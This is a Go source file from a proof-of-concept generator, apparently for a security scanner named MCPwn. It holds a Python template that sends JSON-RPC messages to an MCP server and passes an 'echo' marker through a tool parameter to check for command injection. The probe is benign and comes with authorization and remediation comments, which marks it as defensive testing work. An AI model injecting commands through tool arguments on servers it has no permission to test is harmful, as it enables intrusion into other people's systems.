package pocgen

const pythonTemplate = `import json
import sys
import uuid

# MCPwn Proof of Concept - didactic demonstration only
# Tool: {TOOL} | Finding: {RULEID} | Severity: {SEVERITY}
# Confirmed evidence: {EVIDENCE}
# Authorized testing only: run exclusively against servers you own or have written permission to test.
# Usage: python3 pocs/{NAME} | {TARGET}
# Expected result: the server output contains the marker shown below.

MARKER = "mcpwn_probe_" + uuid.uuid4().hex[:16]

def send(message):
    print(json.dumps(message), flush=True)

def main():
    print("expected: server output contains marker " + MARKER, file=sys.stderr)
    send({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "MCPwn PoC", "version": "1.0.0"}}})
    send({"jsonrpc": "2.0", "method": "notifications/initialized"})
    send({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "{TOOL}", "arguments": {"{PARAM}": "echo " + MARKER}}})
    print("[+] PoC executed: probe sent, look for marker " + MARKER + " in the server output above", file=sys.stderr)

if __name__ == "__main__":
    main()

# Remediation: {REMEDIATION}
`
